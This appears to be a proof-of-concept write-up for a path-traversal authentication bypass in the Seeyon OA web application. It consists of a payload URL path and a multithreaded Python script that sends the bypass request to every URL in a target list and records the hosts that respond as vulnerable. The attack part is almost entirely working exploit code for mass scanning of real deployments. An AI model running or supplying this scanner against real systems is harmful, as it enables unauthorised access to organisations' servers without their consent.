payload

```markdown
/seeyon/thirdpartyController.do.css/…;/ajax.do
```

poc

```python
# -*- coding: utf-8 -*-
'''
@Time    : 2024-09-01
@Author  : juyou
@File    : poc.py

'''
import threading
import requests

with open('urls.txt', 'r') as file:
    urls = file.read().splitlines()

result_file = open('result.txt', 'w')

lock = threading.Lock()

def scan_url(url):
    if 'https' not in url:
        url = 'http://' + url
    try:
        url_payload = url + '/seeyon/thirdpartyController.do.css/..;/ajax.do'
        response = requests.get(url_payload, timeout=5)
        if 'java.lang.NullPointerException:null' in response.text and response.status_code == 200:
            with lock:
                print(url_payload)
                result_file.write(f'{url}\n')
        else:
            pass
    except requests.exceptions.RequestException:
        with lock:
            pass

threads = []
for url in urls:
    thread = threading.Thread(target=scan_url, args=[url])
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

result_file.close()

```

